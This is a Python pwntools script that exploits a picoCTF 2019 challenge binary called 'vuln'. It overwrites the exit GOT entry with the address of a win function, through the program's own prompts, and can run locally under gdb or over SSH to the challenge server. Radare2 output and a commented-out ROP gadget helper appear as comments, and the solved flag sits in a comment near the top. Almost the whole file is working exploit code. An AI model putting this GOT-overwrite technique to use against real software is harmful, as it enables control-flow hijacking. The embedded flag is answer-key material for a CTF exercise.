from pwn import *
import sys
import subprocess
import r2pipe
# picoCTF{A_s0ng_0f_1C3_and_f1r3_024afffd}
argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

# if context.bits == 64:
#   r = process(['ROPgadget', '--binary', BINARY])
#   gadgets = r.recvall().strip().split('\n')[2:-2]
#   gadgets = map(lambda x: x.split(' : '),gadgets)
#   gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
#   r.close()

#   pop_rdi = 0
#   pop_rsi_r15 = 0
#   pop_rdx = 0

#   for addr, name in gadgets:
#     if 'pop rdi ; ret' in name:
#       pop_rdi = addr
#     if 'pop rsi ; pop r15 ; ret' in name:
#       pop_rsi_r15 = addr
#     if 'pop rdx ; ret' in name:
#       pop_rdx = addr

#   def call(f, a1, a2, a3):
#     out = ''
#     if a1 != None:
#       out += p64(pop_rdi)+p64(a1)
#     if a2 != None:
#       out += p64(pop_rsi_r15)+p64(a2)*2
#     if a3 != None:
#       if pop_rdx == 0:
#         print 'RDX GADGET NOT FOUND'
#         exit(-1)
#       else:
#         out += p64(rdx)+p64(a3)
#     return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'


if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/got_1_68eadd091792eac9f121318804787025')
  REMOTE = True

# $ r2 ./vuln
# [0x080484b0]> aaaa
# [0x080484b0]> afl~win
# 0x080485c6    3 153          sym.win
# [0x080484b0]> afl~exit
# 0x08048460    1 6            sym.imp.exit
# [0x080484b0]> pdf @ sym.imp.exit
# / (fcn) sym.imp.exit 6
# \           0x08048460      ff251ca00408   jmp dword [reloc.exit]      ; 0x804a01c ; "f\x84\x04\bv\x84\x04\b\x86\x84\x04\b\x96\x84\x04\b"

exit_got = 0x804a01c
win_addr = 0x080485c6

sh.sendlineafter('address\n', str(exit_got))
sh.sendlineafter('value?\n', str(win_addr))

sh.interactive()